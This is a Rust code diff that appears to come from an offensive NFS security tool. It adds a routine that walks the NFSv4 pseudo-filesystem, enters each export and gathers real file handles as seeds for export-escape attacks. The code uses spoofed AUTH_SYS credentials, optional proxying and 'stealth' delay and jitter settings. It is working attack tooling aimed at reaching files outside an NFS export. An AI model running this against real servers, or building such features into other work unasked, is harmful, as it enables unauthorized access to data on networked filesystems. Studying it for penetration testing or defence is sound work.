@@ -258,6 +258,22 @@ async fn run_all(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u3
         eprintln!("{}", crate::output::status_warn("  NFSv4 LOOKUP failed"));
     }
 
+    // Source 4: NFSv4 pseudo-FS walk -- enter every export and LOOKUP a child
+    // to get real filesystem handles (fileid_type > 0) as additional seeds.
+    // The export root handles are fileid_type=0 (synthetic); a child LOOKUP
+    // produces a handle with actual inode data, which gives better escape
+    // candidates on different filesystems.
+    {
+        let v4_seeds = gather_v4_export_seeds(host, globals).await;
+        for (path, fh) in &v4_seeds {
+            let label = format!("NFSv4 {path} child ({} bytes)", fh.len());
+            eprintln!("{}", crate::output::status_info(&format!("  {label}: {}", fh.to_hex())));
+            if seen_seed_bytes.insert(fh.as_bytes().to_vec()) {
+                seeds.push(EscapeSeed { handle: fh.clone(), source: label });
+            }
+        }
+    }
+
     if seeds.is_empty() {
         eprintln!("{}", crate::output::status_err("No seed handles acquired from any source -- export may not exist or server is unreachable"));
         return Ok(());
@@ -440,6 +456,86 @@ async fn acquire_v4_lookup_handle(host: &str, export: &str, globals: &GlobalOpts
         return None; // didn't leave the pseudo-root
     }
     Some(FileHandle::from_bytes(&fh))
+}
+
+/// Walk the NFSv4 pseudo-FS, enter every discovered export, LOOKUP a child
+/// to get a real filesystem handle (fileid_type > 0), and return all of them.
+///
+/// Export discovery uses fsid comparison: the pseudo-FS has one fsid, and
+/// each real export has a different one. Once inside an export, READDIR +
+/// LOOKUP on the first child yields a handle with actual inode data (not
+/// just the export root's fileid_type=0 handle).
+async fn gather_v4_export_seeds(host: &str, globals: &GlobalOpts) -> Vec<(String, FileHandle)> {
+    use crate::proto::nfs4::Nfs4Client as PooledNfs4Client;
+
+    let Ok(addr) = parse_addr_with_port(host, globals.nfs_port) else { return Vec::new() };
+    let nfs_port = globals.nfs_port.unwrap_or(2049);
+
+    let pool = std::sync::Arc::new(match &globals.proxy {
+        Some(p) => ConnectionPool::with_proxy(p.clone()),
+        None => ConnectionPool::default_config(),
+    });
+    let circuit = std::sync::Arc::new(CircuitBreaker::default_config());
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+    let gids = crate::cli::probe::build_gid_list(globals.gid, &globals.aux_gids);
+    let cred = Credential::Sys(AuthSys::with_groups(globals.uid, globals.gid, &gids, &globals.hostname));
+    let pool_key = PoolKey { host: addr, export: format!("__v4_gather__{nfs_port}"), uid: globals.uid, gid: globals.gid };
+    let transport = PooledTransport::new_direct(pool, pool_key, circuit, stealth, cred, ReconnectStrategy::Persistent, nfs_port);
+    let client = PooledNfs4Client::new(transport);
+
+    // Get pseudo-root FH + fsid.
+    let Ok(root_fh) = client.get_root_fh().await else { return Vec::new() };
+    let root_fsid = match client.getattr(&root_fh).await {
+        Ok(info) => info.fsid.unwrap_or((0, 0)),
+        Err(_) => return Vec::new(),
+    };
+
+    let mut results: Vec<(String, FileHandle)> = Vec::new();
+    // DFS: (dir_fh, parent_fsid, path_prefix)
+    let mut stack: Vec<(Vec<u8>, (u64, u64), String)> = vec![(root_fh, root_fsid, String::new())];
+    let mut depth = 0u32;
+
+    while let Some((dir_fh, parent_fsid, prefix)) = stack.pop() {
+        if depth > 10 {
+            break;
+        }
+        depth += 1;
+
+        // List children of this directory.
+        let Ok(entries) = client.list_dir(&dir_fh).await else { continue };
+
+        for name in &entries {
+            if name == "." || name == ".." {
+                continue;
+            }
+            // LOOKUP child + GETATTR(fsid) + GETFH.
+            let Ok((child_fh, child_info)) = client.lookup(dir_fh.as_slice(), name).await else { continue };
+            let child_fsid = child_info.fsid.unwrap_or(parent_fsid);
+            let child_path = if prefix.is_empty() { format!("/{name}") } else { format!("{prefix}/{name}") };
+
+            if child_fsid != parent_fsid {
+                // Crossed into a real export. Now READDIR inside it and
+                // LOOKUP the first child to get a handle with fileid_type > 0.
+                if let Ok(export_entries) = client.list_dir(&child_fh).await {
+                    for child_name in &export_entries {
+                        if child_name == "." || child_name == ".." {
+                            continue;
+                        }
+                        if let Ok((inner_fh, _)) = client.lookup(child_fh.as_slice(), child_name).await {
+                            results.push((child_path.clone(), FileHandle::from_bytes(&inner_fh)));
+                            break; // one child per export is enough
+                        }
+                    }
+                }
+                // Also keep the export root handle as a seed (fileid_type=0).
+                results.push((child_path, FileHandle::from_bytes(&child_fh)));
+            } else if child_info.ftype == Some(nfs_v4::Nfs4FileType::Directory) {
+                // Same fsid = pseudo-directory, recurse.
+                stack.push((child_fh, parent_fsid, child_path));
+            }
+        }
+    }
+    results
 }
 
 /// Try NFSv3 escape first, then NFSv2 fallback, then NFSv4 LOOKUPP.
